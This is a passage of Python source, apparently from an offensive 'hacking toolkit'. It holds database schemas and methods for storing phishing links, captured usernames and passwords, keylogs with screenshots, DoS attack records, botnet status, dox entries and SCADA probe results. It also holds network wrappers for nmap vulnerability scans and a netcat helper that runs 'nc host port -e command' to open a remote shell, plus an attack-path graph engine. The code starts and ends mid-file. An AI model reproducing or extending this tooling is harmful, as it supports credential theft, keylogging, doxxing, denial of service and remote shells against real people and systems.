                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1,
                host_ip TEXT,
                host_port INTEGER,
                short_url TEXT,
                custom_html TEXT
            )
            """,
            # Captured Credentials
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            # Keylogs
            """
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                text TEXT,
                window TEXT,
                process TEXT,
                screenshot_path TEXT
            )
            """,
            # DOS Attacks
            """
            CREATE TABLE IF NOT EXISTS dos_attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                attack_type TEXT NOT NULL,
                target TEXT NOT NULL,
                port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            # Bot Status
            """
            CREATE TABLE IF NOT EXISTS bot_status (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                status TEXT DEFAULT 'offline',
                connected_at DATETIME,
                last_activity DATETIME,
                commands_processed INTEGER DEFAULT 0,
                errors INTEGER DEFAULT 0
            )
            """,
            # Dox Entries
            """
            CREATE TABLE IF NOT EXISTS dox_entries (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                data TEXT,
                source TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            # Scans
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                success BOOLEAN DEFAULT 1,
                vulnerabilities TEXT
            )
            """,
            # Mass Scans
            """
            CREATE TABLE IF NOT EXISTS mass_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                network TEXT NOT NULL,
                total_hosts INTEGER,
                alive_hosts INTEGER,
                scan_results TEXT,
                scan_time REAL
            )
            """,
            # Binary Analysis
            """
            CREATE TABLE IF NOT EXISTS binary_analysis (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                file_path TEXT NOT NULL,
                file_type TEXT,
                architecture TEXT,
                analysis_result TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            # APK Analysis
            """
            CREATE TABLE IF NOT EXISTS apk_analysis (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                file_path TEXT NOT NULL,
                package_name TEXT,
                analysis_result TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            # Attack Paths
            """
            CREATE TABLE IF NOT EXISTS attack_paths (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                path_data TEXT,
                total_weight REAL,
                nodes_count INTEGER,
                success BOOLEAN DEFAULT 1
            )
            """,
            # Attack Nodes
            """
            CREATE TABLE IF NOT EXISTS attack_nodes (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                node_type TEXT NOT NULL,
                ip TEXT,
                port INTEGER,
                service TEXT,
                vulnerability TEXT,
                risk_score REAL
            )
            """,
            # Attack Edges
            """
            CREATE TABLE IF NOT EXISTS attack_edges (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                source TEXT NOT NULL,
                target TEXT NOT NULL,
                weight REAL,
                exploit_type TEXT,
                description TEXT
            )
            """,
            # LLM Conversations
            """
            CREATE TABLE IF NOT EXISTS llm_conversations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                user_message TEXT,
                assistant_response TEXT,
                context TEXT
            )
            """,
            # Steganography
            """
            CREATE TABLE IF NOT EXISTS steganography (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                operation TEXT NOT NULL,
                input_file TEXT,
                output_file TEXT,
                message TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            # Encryption
            """
            CREATE TABLE IF NOT EXISTS encryption (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                operation TEXT NOT NULL,
                algorithm TEXT NOT NULL,
                input_file TEXT,
                output_file TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            # SCADA Results
            """
            CREATE TABLE IF NOT EXISTS scada_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                protocol TEXT,
                port INTEGER,
                response TEXT,
                success BOOLEAN DEFAULT 1
            )
            """
        ]
        
        with self._lock:
            for sql in tables:
                try:
                    self.conn.execute(sql)
                except Exception as e:
                    logger.error(f"Table creation error: {e}")
            self.conn.commit()
    
    def log_command(self, command: str, source: str = "local", platform: str = None,
                   user_id: str = None, success: bool = True, output: str = "",
                   execution_time: float = 0.0):
        """Log a command execution"""
        with self._lock:
            try:
                self.conn.execute(
                    """INSERT INTO command_history 
                       (command, source, platform, user_id, success, output, execution_time)
                       VALUES (?, ?, ?, ?, ?, ?, ?)""",
                    (command, source, platform, user_id, success, output[:5000], execution_time)
                )
                self.conn.commit()
            except Exception as e:
                logger.error(f"Failed to log command: {e}")
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str):
        """Log a threat"""
        with self._lock:
            try:
                self.conn.execute(
                    "INSERT INTO threats (threat_type, source_ip, severity, description) VALUES (?, ?, ?, ?)",
                    (threat_type, source_ip, severity, description)
                )
                self.conn.commit()
            except Exception as e:
                logger.error(f"Failed to log threat: {e}")
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        """Get recent threats"""
        try:
            rows = self.conn.execute(
                "SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?", (limit,)
            ).fetchall()
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_managed_ip(self, ip: str, domain: str = None, added_by: str = "system", notes: str = "") -> bool:
        """Add an IP to managed list"""
        try:
            ipaddress.ip_address(ip)
            with self._lock:
                self.conn.execute(
                    "INSERT OR IGNORE INTO managed_ips (ip_address, domain, added_by, notes) VALUES (?, ?, ?, ?)",
                    (ip, domain, added_by, notes)
                )
                self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add IP: {e}")
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        """Get managed IPs"""
        try:
            with self._lock:
                if include_blocked:
                    rows = self.conn.execute("SELECT * FROM managed_ips ORDER BY added_date DESC")
                else:
                    rows = self.conn.execute("SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC")
                return [dict(row) for row in rows]
        except:
            return []
    
    def save_ssh_connection(self, conn: SSHConnection) -> bool:
        """Save SSH connection"""
        try:
            with self._lock:
                self.conn.execute(
                    """INSERT OR REPLACE INTO ssh_connections 
                       (id, name, host, port, username, password_encrypted, key_path, status, created_at)
                       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                    (conn.id, conn.name, conn.host, conn.port, conn.username,
                     conn.password, conn.key_path, conn.status, conn.created_at)
                )
                self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save SSH connection: {e}")
            return False
    
    def get_ssh_connections(self) -> List[Dict]:
        """Get SSH connections"""
        try:
            with self._lock:
                rows = self.conn.execute("SELECT * FROM ssh_connections ORDER BY name")
                return [dict(row) for row in rows]
        except:
            return []
    
    def save_phishing_link(self, link: PhishingLink) -> bool:
        """Save phishing link"""
        try:
            with self._lock:
                self.conn.execute(
                    """INSERT INTO phishing_links 
                       (id, platform, phishing_url, template, created_at, clicks, host_ip, host_port, short_url)
                       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                    (link.id, link.platform, link.phishing_url, link.template, link.created_at,
                     link.clicks, link.host_ip, link.host_port, link.short_url)
                )
                self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing link: {e}")
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        """Get phishing links"""
        try:
            with self._lock:
                if active_only:
                    rows = self.conn.execute("SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC")
                else:
                    rows = self.conn.execute("SELECT * FROM phishing_links ORDER BY created_at DESC")
                return [dict(row) for row in rows]
        except:
            return []
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str):
        """Save captured credential"""
        try:
            with self._lock:
                self.conn.execute(
                    """INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                       VALUES (?, ?, ?, ?, ?)""",
                    (link_id, username, password, ip_address, user_agent)
                )
                self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save credential: {e}")
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        """Get captured credentials"""
        try:
            with self._lock:
                if link_id:
                    rows = self.conn.execute(
                        "SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC",
                        (link_id,)
                    )
                else:
                    rows = self.conn.execute("SELECT * FROM captured_credentials ORDER BY timestamp DESC")
                return [dict(row) for row in rows]
        except:
            return []
    
    def save_keylog(self, text: str, window: str = "", process: str = "", screenshot_path: str = ""):
        """Save keylog entry"""
        try:
            with self._lock:
                self.conn.execute(
                    "INSERT INTO keylogs (text, window, process, screenshot_path) VALUES (?, ?, ?, ?)",
                    (text[:5000], window[:100], process[:100], screenshot_path)
                )
                self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save keylog: {e}")
    
    def get_keylogs(self, limit: int = 100) -> List[Dict]:
        """Get keylogs"""
        try:
            with self._lock:
                rows = self.conn.execute("SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT ?", (limit,))
                return [dict(row) for row in rows]
        except:
            return []
    
    def log_dos_attack(self, attack_type: str, target: str, port: int, duration: int,
                       packets_sent: int, status: str, executed_by: str = "system"):
        """Log DOS attack"""
        try:
            with self._lock:
                self.conn.execute(
                    """INSERT INTO dos_attacks 
                       (attack_type, target, port, duration, packets_sent, status, executed_by)
                       VALUES (?, ?, ?, ?, ?, ?, ?)""",
                    (attack_type, target, port, duration, packets_sent, status, executed_by)
                )
                self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log DOS attack: {e}")
    
    def update_bot_status(self, platform: str, status: str, commands_processed: int = 0, errors: int = 0):
        """Update bot status"""
        try:
            with self._lock:
                existing = self.conn.execute(
                    "SELECT * FROM bot_status WHERE platform = ?", (platform,)
                ).fetchone()
                
                if existing:
                    self.conn.execute(
                        """UPDATE bot_status 
                           SET status = ?, last_activity = CURRENT_TIMESTAMP,
                               commands_processed = commands_processed + ?,
                               errors = errors + ?
                           WHERE platform = ?""",
                        (status, commands_processed, errors, platform)
                    )
                else:
                    self.conn.execute(
                        """INSERT INTO bot_status (id, platform, status, connected_at, last_activity, commands_processed, errors)
                           VALUES (?, ?, ?, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, ?, ?)""",
                        (str(uuid.uuid4())[:8], platform, status, commands_processed, errors)
                    )
                self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update bot status: {e}")
    
    def get_bot_status(self) -> List[Dict]:
        """Get bot status"""
        try:
            with self._lock:
                rows = self.conn.execute("SELECT * FROM bot_status ORDER BY platform")
                return [dict(row) for row in rows]
        except:
            return []
    
    def save_dox(self, target: str, data: Dict, source: str) -> bool:
        """Save dox entry"""
        try:
            with self._lock:
                self.conn.execute(
                    "INSERT INTO dox_entries (target, data, source) VALUES (?, ?, ?)",
                    (target, json.dumps(data), source)
                )
                self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save dox: {e}")
            return False
    
    def get_dox_entries(self, limit: int = 50) -> List[Dict]:
        """Get dox entries"""
        try:
            with self._lock:
                rows = self.conn.execute("SELECT * FROM dox_entries ORDER BY created_at DESC LIMIT ?", (limit,))
                return [dict(row) for row in rows]
        except:
            return []
    
    def save_binary_analysis(self, file_path: str, file_type: str, architecture: str,
                            analysis_result: str, success: bool):
        """Save binary analysis"""
        try:
            with self._lock:
                self.conn.execute(
                    """INSERT INTO binary_analysis 
                       (file_path, file_type, architecture, analysis_result, success)
                       VALUES (?, ?, ?, ?, ?)""",
                    (file_path, file_type, architecture, analysis_result[:10000], success)
                )
                self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save binary analysis: {e}")
    
    def save_apk_analysis(self, file_path: str, package_name: str, analysis_result: str, success: bool):
        """Save APK analysis"""
        try:
            with self._lock:
                self.conn.execute(
                    """INSERT INTO apk_analysis 
                       (file_path, package_name, analysis_result, success)
                       VALUES (?, ?, ?, ?)""",
                    (file_path, package_name, analysis_result[:10000], success)
                )
                self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save APK analysis: {e}")
    
    def save_attack_path(self, target: str, path_data: str, total_weight: float,
                        nodes_count: int, success: bool):
        """Save attack path"""
        try:
            with self._lock:
                self.conn.execute(
                    """INSERT INTO attack_paths 
                       (target, path_data, total_weight, nodes_count, success)
                       VALUES (?, ?, ?, ?, ?)""",
                    (target, path_data[:10000], total_weight, nodes_count, success)
                )
                self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save attack path: {e}")
    
    def save_llm_conversation(self, user_message: str, assistant_response: str, context: str = ""):
        """Save LLM conversation"""
        try:
            with self._lock:
                self.conn.execute(
                    """INSERT INTO llm_conversations 
                       (user_message, assistant_response, context)
                       VALUES (?, ?, ?)""",
                    (user_message, assistant_response, context)
                )
                self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save LLM conversation: {e}")
    
    def save_steganography(self, operation: str, input_file: str, output_file: str,
                           message: str, success: bool):
        """Save steganography operation"""
        try:
            with self._lock:
                self.conn.execute(
                    """INSERT INTO steganography 
                       (operation, input_file, output_file, message, success)
                       VALUES (?, ?, ?, ?, ?)""",
                    (operation, input_file, output_file, message[:500], success)
                )
                self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save steganography: {e}")
    
    def save_encryption(self, operation: str, algorithm: str, input_file: str,
                        output_file: str, success: bool):
        """Save encryption operation"""
        try:
            with self._lock:
                self.conn.execute(
                    """INSERT INTO encryption 
                       (operation, algorithm, input_file, output_file, success)
                       VALUES (?, ?, ?, ?, ?)""",
                    (operation, algorithm, input_file, output_file, success)
                )
                self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save encryption: {e}")
    
    def save_scada_result(self, target: str, protocol: str, port: int, response: str, success: bool):
        """Save SCADA result"""
        try:
            with self._lock:
                self.conn.execute(
                    """INSERT INTO scada_results 
                       (target, protocol, port, response, success)
                       VALUES (?, ?, ?, ?, ?)""",
                    (target, protocol, port, response[:5000], success)
                )
                self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save SCADA result: {e}")
    
    def get_statistics(self) -> Dict:
        """Get system statistics"""
        stats = {}
        try:
            with self._lock:
                stats['total_commands'] = self.conn.execute("SELECT COUNT(*) FROM command_history").fetchone()[0]
                stats['total_threats'] = self.conn.execute("SELECT COUNT(*) FROM threats").fetchone()[0]
                stats['total_managed_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips").fetchone()[0]
                stats['total_ssh_connections'] = self.conn.execute("SELECT COUNT(*) FROM ssh_connections").fetchone()[0]
                stats['total_phishing_links'] = self.conn.execute("SELECT COUNT(*) FROM phishing_links").fetchone()[0]
                stats['captured_credentials'] = self.conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
                stats['total_keylogs'] = self.conn.execute("SELECT COUNT(*) FROM keylogs").fetchone()[0]
                stats['total_dos_attacks'] = self.conn.execute("SELECT COUNT(*) FROM dos_attacks").fetchone()[0]
                stats['total_bots'] = self.conn.execute("SELECT COUNT(*) FROM bot_status").fetchone()[0]
                stats['online_bots'] = self.conn.execute("SELECT COUNT(*) FROM bot_status WHERE status = 'online'").fetchone()[0]
                stats['total_dox'] = self.conn.execute("SELECT COUNT(*) FROM dox_entries").fetchone()[0]
                stats['total_binary_analyses'] = self.conn.execute("SELECT COUNT(*) FROM binary_analysis").fetchone()[0]
                stats['total_apk_analyses'] = self.conn.execute("SELECT COUNT(*) FROM apk_analysis").fetchone()[0]
                stats['total_attack_paths'] = self.conn.execute("SELECT COUNT(*) FROM attack_paths").fetchone()[0]
        except Exception as e:
            logger.error(f"Failed to get stats: {e}")
        return stats
    
    def close(self):
        """Close database connection"""
        try:
            with self._lock:
                self.conn.close()
        except:
            pass

# ============================================================
# NETWORK TOOLS
# ============================================================
class NetworkTools:
    """Network utility functions"""
    
    @staticmethod
    def ping(target: str, count: int = 4) -> CommandResult:
        """Ping a target"""
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), target]
            else:
                cmd = ['ping', '-c', str(count), target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def traceroute(target: str) -> CommandResult:
        """Trace route to target"""
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert', '-d', target]
            else:
                if shutil.which('mtr'):
                    cmd = ['mtr', '--report', '--report-cycles', '1', target]
                else:
                    cmd = ['traceroute', '-n', target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def nmap(target: str, scan_type: str = "quick") -> CommandResult:
        """Run nmap scan"""
        start_time = time.time()
        try:
            scan_map = {
                "quick": ['nmap', '-T4', '-F', target],
                "full": ['nmap', '-p-', target],
                "service": ['nmap', '-sV', target],
                "os": ['nmap', '-O', target],
                "udp": ['nmap', '-sU', target],
                "vuln": ['nmap', '--script', 'vuln', target],
                "stealth": ['nmap', '-sS', '-T2', target],
                "aggressive": ['nmap', '-A', '-T4', target],
                "comprehensive": ['nmap', '-sS', '-sV', '-O', '-p-', target],
                "ping": ['nmap', '-sn', target],
                "mass": ['nmap', '-T4', '-F', '--open', target],
                "smb": ['nmap', '--script', 'smb-*', target],
                "snmp": ['nmap', '--script', 'snmp-*', target],
                "ssh": ['nmap', '--script', 'ssh-*', target]
            }
            cmd = scan_map.get(scan_type, ['nmap', target])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def curl(url: str, method: str = "GET", data: str = None) -> CommandResult:
        """Make HTTP request"""
        start_time = time.time()
        try:
            if method.upper() == "GET":
                cmd = ['curl', '-s', url]
            elif method.upper() == "POST":
                cmd = ['curl', '-s', '-X', 'POST', '-d', data or '', url]
            else:
                cmd = ['curl', '-s', '-X', method, url]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def wget(url: str, output: str = None) -> CommandResult:
        """Download file"""
        start_time = time.time()
        try:
            cmd = ['wget', '-q']
            if output:
                cmd.extend(['-O', output])
            cmd.append(url)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def netcat(host: str, port: int, command: str = None) -> CommandResult:
        """Netcat operations"""
        start_time = time.time()
        try:
            if shutil.which('nc'):
                if command:
                    cmd = ['nc', host, str(port), '-e', command]
                else:
                    cmd = ['nc', '-zv', host, str(port)]
            elif shutil.which('ncat'):
                if command:
                    cmd = ['ncat', host, str(port), '-e', command]
                else:
                    cmd = ['ncat', '-zv', host, str(port)]
            else:
                return CommandResult(False, "Netcat not found", 0, "nc/ncat not installed")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def get_local_ip() -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def location(ip: str) -> Dict:
        """Get IP geolocation"""
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'country': data.get('country'),
                        'city': data.get('city'),
                        'isp': data.get('isp'),
                        'lat': data.get('lat'),
                        'lon': data.get('lon')
                    }
            return {'success': False}
        except:
            return {'success': False}
    
    @staticmethod
    def ip_to_domain(ip: str) -> Optional[str]:
        """Convert IP to domain"""
        try:
            domain = socket.gethostbyaddr(ip)[0]
            if domain:
                return domain
        except:
            pass
        return None
    
    @staticmethod
    def domain_to_ip(domain: str) -> Optional[str]:
        """Convert domain to IP"""
        try:
            ip = socket.gethostbyname(domain)
            if ip:
                return ip
        except:
            pass
        return None

# ============================================================
# DIJKSTRA ATTACK PATH ENGINE
# ============================================================
class DijkstraAttackPathEngine:
    """Dijkstra algorithm for finding shortest attack paths"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.nodes: Dict[str, AttackNode] = {}
        self.edges: List[AttackEdge] = []
        self.adjacency: Dict[str, List[Tuple[str, float, AttackEdge]]] = {}
    
    def add_node(self, node: AttackNode):
        """Add a node to the graph"""
        self.nodes[node.id] = node
        if node.id not in self.adjacency:
            self.adjacency[node.id] = []
    
    def add_edge(self, source: str, target: str, weight: float, exploit_type: str, description: str = ""):
        """Add an edge to the graph"""
        edge = AttackEdge(source=source, target=target, weight=weight,
                         exploit_type=exploit_type, description=description)
        self.edges.append(edge)
        
        if source not in self.adjacency:
            self.adjacency[source] = []
        self.adjacency[source].append((target, weight, edge))
    
    def dijkstra(self, start: str, end: str) -> Optional[AttackPath]:
        """Find shortest path using Dijkstra's algorithm"""
        if start not in self.adjacency:
            return None
        
        # Initialize distances
        distances = {node_id: float('inf') for node_id in self.nodes}
        distances[start] = 0
        previous = {node_id: None for node_id in self.nodes}
        previous_edge = {node_id: None for node_id in self.nodes}
        
        # Priority queue
        pq = [(0, start)]
        visited = set()
        
        while pq:
            current_dist, current = heappop(pq)
            
            if current in visited:
                continue
            
            visited.add(current)
            
            if current == end:
                break
            
            if current not in self.adjacency:
                continue
            
            for neighbor, weight, edge in self.adjacency[current]:
                if neighbor in visited:
                    continue
                
                new_dist = current_dist + weight
                
                if new_dist < distances.get(neighbor, float('inf')):
                    distances[neighbor] = new_dist
                    previous[neighbor] = current
                    previous_edge[neighbor] = edge
                    heappush(pq, (new_dist, neighbor))
        
        # Reconstruct path
        if distances.get(end, float('inf')) == float('inf'):
            return None
        
        path_nodes = []
        path_edges = []
        current = end
        
        while current is not None:
            path_nodes.append(current)
            if previous[current] is not None:
                path_edges.append(previous_edge[current])
            current = previous[current]
        
        path_nodes.reverse()
        path_edges.reverse()
        
        return AttackPath(
            nodes=path_nodes,
            edges=path_edges,
            total_weight=distances[end],
            description=f"Shortest attack path from {start} to {end}"
        )
    
    def find_all_paths(self, start: str, end: str, max_depth: int = 10) -> List[AttackPath]:
        """Find all paths up to max_depth using DFS"""
        paths = []
        
        def dfs(current: str, visited: Set[str], path_nodes: List[str],
                path_edges: List[AttackEdge], total_weight: float):
            if len(path_nodes) > max_depth:
                return
            
            if current == end:
                paths.append(AttackPath(
                    nodes=path_nodes.copy(),
                    edges=path_edges.copy(),
                    total_weight=total_weight,
                    description=f"Attack path from {start} to {end}"
                ))
                return
            
            if current not in self.adjacency:
                return
            
            for neighbor, weight, edge in self.adjacency[current]:
                if neighbor not in visited:
                    visited.add(neighbor)
                    path_nodes.append(neighbor)
                    path_edges.append(edge)
                    dfs(neighbor, visited, path_nodes, path_edges, total_weight + weight)
                    path_nodes.pop()
                    path_edges.pop()
                    visited.remove(neighbor)
        
        dfs(start, {start}, [start], [], 0.0)
        
        # Sort by total weight
        paths.sort(key=lambda p: p.total_weight)
        
        return paths
    
    def build_from_scan_results(self, target_ip: str, scan_results: Dict):
        """Build attack graph from scan results"""
        # Add entry point node
        entry_id = f"entry_{target_ip}"
        self.add_node(AttackNode(
            id=entry_id,
            name=f"Entry Point {target_ip}",
            node_type="entry_point",
            ip=target_ip,
            risk_score=1.0
        ))
        
        # Add vulnerability nodes from scan results
        if 'open_ports' in scan_results:
            for port_info in scan_results['open_ports']:
                port = port_info.get('port', 0)
                service = port_info.get('service', 'unknown')
                
                vuln_id = f"vuln_{target_ip}_{port}"
                vuln_node = AttackNode(
                    id=vuln_id,
                    name=f"Service {service} on port {port}",
                    node_type="vulnerability",
                    ip=target_ip,
                    port=port,
                    service=service,
                    risk_score=5.0
                )
                self.add_node(vuln_node)
                
                # Add edge from entry to vulnerability
                self.add_edge(
                    entry_id, vuln_id, 1.0,
                    exploit_type=f"exploit_{service}",
                    description=f"Exploit {service} on port {port}"
                )
        
        # Add target node
        target_id = f"target_{target_ip}"
        self.add_node(AttackNode(
            id=target_id,
            name=f"Target {target_ip}",
            node_type="target",
            ip=target_ip,
            risk_score=10.0
        ))
        
        # Connect vulnerabilities to target
        for node_id, node in self.nodes.items():
            if node.node_type == "vulnerability":
                self.add_edge(
                    node_id, target_id, 2.0,
                    exploit_type="privilege_escalation",
                    description="Escalate privileges to root"
                )
    
    def get_graph_statistics(self) -> Dict:
        """Get statistics about the attack graph"""
        return {
            'nodes': len(self.nodes),
            'edges': len(self.edges),
            'entry_points': len([n for n in self.nodes.values() if n.node_type == 'entry_point']),
            'vulnerabilities': len([n for n in self.nodes.values() if n.node_type == 'vulnerability']),
            'targets': len([n for n in self.nodes.values() if n.node_type == 'target'])
        }
    
    def clear(self):
        """Clear the graph"""
        self.nodes.clear()
        self.edges.clear()
        self.adjacency.clear()

# ============================================================
# BINARY ANALYSIS ENGINE
# ============================================================
class BinaryAnalysisEngine:
    """Binary analysis and reverse engineering"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def analyze_binary(self, file_path: str) -> Dict:
        """Analyze a binary file"""
        if not os.path.exists(file_path):
            return {'success': False, 'error': f'File not found: {file_path}'}
        
        result = {
            'success': True,
            'file_path': file_path,
            'file_type': 'unknown',
            'architecture': 'unknown',
            'sections': [],
            'imports': [],
            'exports': [],
            'strings': [],
            'vulnerabilities': []
        }
        
        try:
            # Get file type
            file_output = subprocess.run(['file', file_path], capture_output=True, text=True)
            result['file_type'] = file_output.stdout.strip() if file_output.stdout else 'unknown'
            
            # Get architecture
            if 'ELF' in result['file_type']:
                result['architecture'] = 'ELF'
            elif 'PE32' in result['file_type'] or 'PE32+' in result['file_type']:
                result['architecture'] = 'PE'
            elif 'Mach-O' in result['file_type']:
                result['architecture'] = 'Mach-O'
            
            # Extract strings
            result['strings'] = self._extract_strings(file_path)
            
            # Analyze PE file if applicable
            if result['architecture'] == 'PE' and PEFILE_AVAILABLE:
                result.update(self._analyze_pe(file_path))
            
            # Disassemble if capstone available
            if CAPSTONE_AVAILABLE:
                result['disassembly'] = self._disassemble(file_path)
            
            # Check for packing
            result['vulnerabilities'].extend(self._check_vulnerabilities(result))
            
            # Save to database
            self.db.save_binary_analysis(
                file_path,
                result['file_type'],
                result['architecture'],
                json.dumps(result),
                True
            )
            
        except Exception as e:
            result['success'] = False
            result['error'] = str(e)
        
        return result
    
    def _extract_strings(self, file_path: str, min_length: int = 4) -> List[str]:
        """Extract strings from binary"""
        strings = []
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            current = b''
            for byte in data:
                if 32 <= byte <= 126:
                    current += bytes([byte])
                else:
                    if len(current) >= min_length:
                        try:
                            strings.append(current.decode('ascii'))
                        except:
                            pass
                    current = b''
            
            if len(current) >= min_length:
                try:
                    strings.append(current.decode('ascii'))
                except:
                    pass
            
        except Exception as e:
            logger.error(f"String extraction error: {e}")
        
        return strings
    
    def _analyze_pe(self, file_path: str) -> Dict:
        """Analyze PE file"""
        result = {'sections': [], 'imports': [], 'exports': []}
        
        try:
            pe = pefile.PE(file_path)
            
            for section in pe.sections:
                result['sections'].append({
                    'name': section.Name.decode().strip('\x00'),
                    'virtual_address': hex(section.VirtualAddress),
                    'size': section.SizeOfRawData,
                    'entropy': section.get_entropy()
                })
            
            if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
